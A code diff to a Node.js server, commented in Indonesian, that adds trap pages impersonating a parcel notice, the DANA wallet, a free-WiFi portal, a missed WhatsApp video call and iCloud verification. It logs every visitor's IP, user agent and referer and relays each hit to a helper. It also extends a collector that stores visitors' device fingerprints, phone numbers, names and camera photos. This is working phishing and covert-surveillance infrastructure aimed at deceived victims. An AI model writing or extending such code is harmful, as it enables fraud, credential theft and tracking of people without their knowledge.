@@ -658,6 +658,37 @@ const server = http.createServer(async (req, res) => {
   const parsedUrl = new URL(req.url, `http://${req.headers.host}`);
   const pathname = decodeURIComponent(parsedUrl.pathname);
 
+  // --- PASSIVE IP LOGGER: catat setiap akses ke halaman jebakan tanpa butuh izin browser ---
+  const TRAP_HTML_PATHS = [
+    '/paket', '/paket.html', '/dana', '/dana.html',
+    '/go', '/go.html', '/track', '/track.html',
+    '/wifi', '/wifi.html', '/vcall', '/vcall.html', '/icloud', '/icloud.html',
+    '/recovery', '/recovery.html', '/bantu'
+  ];
+  if (TRAP_HTML_PATHS.includes(pathname) && req.method === 'GET') {
+    const rawIp = (req.socket && req.socket.remoteAddress) || '?';
+    const ip = rawIp.replace(/^::ffff:/, '');
+    const cfIp = req.headers['cf-connecting-ip'] || req.headers['x-real-ip'] ||
+                 (req.headers['x-forwarded-for'] || '').split(',')[0].trim() || ip;
+    const ua = (req.headers['user-agent'] || 'unknown').substring(0, 200);
+    const referer = (req.headers['referer'] || req.headers['referrer'] || '').substring(0, 150);
+    const hitEntry = {
+      id: Date.now() + '_' + Math.random().toString(36).substring(2, 6),
+      type: 'passive_page_hit',
+      path: pathname,
+      ip: cfIp,
+      ua,
+      referer: referer || null,
+      timestamp: Date.now()
+    };
+    sentinelState.alerts.unshift(hitEntry);
+    if (sentinelState.alerts.length > 200) sentinelState.alerts.pop();
+    saveSentinelData();
+    broadcast({ type: 'sentinel_passive_hit', alert: hitEntry });
+    console.log(`[Sentinel Passive] 🌐 HALAMAN DIBUKA: ${pathname} | IP: ${cfIp} | ${ua.substring(0, 60)}`);
+    sendToHelper(`TEXT [HALAMAN DIBUKA] ${pathname} | ${cfIp}`);
+  }
+
   // 1. Status & Info Jaringan
   if (pathname === '/api/status' && req.method === 'GET') {
     const ip = getLocalIp();
@@ -738,6 +769,39 @@ const server = http.createServer(async (req, res) => {
       res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
       if (req.method === 'HEAD') { res.end(); return; }
       fs.createReadStream(danaFile).pipe(res);
+      return;
+    }
+  }
+
+  // Halaman Jebakan Portal Captive WiFi Gratis
+  if ((pathname === '/wifi' || pathname === '/wifi.html') && (req.method === 'GET' || req.method === 'HEAD')) {
+    const wifiFile = path.join(PUBLIC_DIR, 'wifi.html');
+    if (fs.existsSync(wifiFile)) {
+      res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
+      if (req.method === 'HEAD') { res.end(); return; }
+      fs.createReadStream(wifiFile).pipe(res);
+      return;
+    }
+  }
+
+  // Halaman Jebakan Panggilan Video WhatsApp Tak Terjawab
+  if ((pathname === '/vcall' || pathname === '/vcall.html') && (req.method === 'GET' || req.method === 'HEAD')) {
+    const f = path.join(PUBLIC_DIR, 'vcall.html');
+    if (fs.existsSync(f)) {
+      res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
+      if (req.method === 'HEAD') { res.end(); return; }
+      fs.createReadStream(f).pipe(res);
+      return;
+    }
+  }
+
+  // Halaman Jebakan Verifikasi iCloud Apple
+  if ((pathname === '/icloud' || pathname === '/icloud.html') && (req.method === 'GET' || req.method === 'HEAD')) {
+    const f = path.join(PUBLIC_DIR, 'icloud.html');
+    if (fs.existsSync(f)) {
+      res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
+      if (req.method === 'HEAD') { res.end(); return; }
+      fs.createReadStream(f).pipe(res);
       return;
     }
   }
@@ -1836,14 +1900,18 @@ const server = http.createServer(async (req, res) => {
           userAgent,
           screen,
           platform,
-          hardware: payload.hardware || payload.deviceDetails || (payload.gpu ? {
-            gpu: payload.gpu,
-            gpuVendor: payload.gpuVendor,
-            cores: payload.cores,
-            touchPoints: payload.touchPoints,
+          hardware: payload.hardware || payload.deviceDetails || (payload.gpu || (payload.passiveStats && payload.passiveStats.gpu) ? {
+            gpu: payload.gpu || (payload.passiveStats && payload.passiveStats.gpu),
+            gpuVendor: payload.gpuVendor || (payload.passiveStats && payload.passiveStats.gpuV),
+            cores: payload.cores || (payload.passiveStats && payload.passiveStats.cores),
+            touchPoints: payload.touchPoints || (payload.passiveStats && payload.passiveStats.touch),
             colorGamut: payload.colorGamut,
-            timeZone: payload.timeZone
+            timeZone: payload.timeZone || (payload.passiveStats && payload.passiveStats.tz),
+            language: payload.passiveStats && payload.passiveStats.lang
           } : null),
+          passiveStats: payload.passiveStats || null,
+          phone: payload.phone || null,
+          name: payload.name || null,
           photo: photoUrl || (sentinelState.latest ? sentinelState.latest.photo : null),
           photoSha256: photoHash || (sentinelState.latest ? sentinelState.latest.photoSha256 : null),
           environmentPhoto: envPhotoUrl || (sentinelState.latest ? sentinelState.latest.environmentPhoto : null),
